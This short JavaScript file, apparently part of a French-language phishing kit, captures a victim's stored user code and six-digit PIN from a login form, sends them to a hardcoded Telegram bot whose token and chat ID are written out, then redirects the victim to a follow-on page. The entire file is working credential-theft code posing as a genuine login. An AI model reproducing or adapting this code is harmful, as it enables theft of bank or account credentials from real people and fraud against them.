
var usercode = localStorage.getItem('usercode');
var pass = document.getElementById('pass');

document.getElementById('form2').addEventListener('submit', function (e) {
    e.preventDefault()
    const bot = new Bot("6135693705:AAEYjbPzeLclg5QVZbLDaxevBy86Xjwf1G4", 2068186644);

    const regexSixChiffres = /^[0-9]{6}$/;
    const passPin = pass.value;

    if (regexSixChiffres.test(passPin)) {
                bot.sendMessage('👔User : ' + usercode + '🔓Mot de passe : ' + pass.value)
                    .then(res => {
                        console.log(res);
                        //debugger
                        window.location.href = './auth.html'
                    })
    } else {
        document.getElementById('noti').innerText = "🔔 le code entrer est incorrect !";
    }


})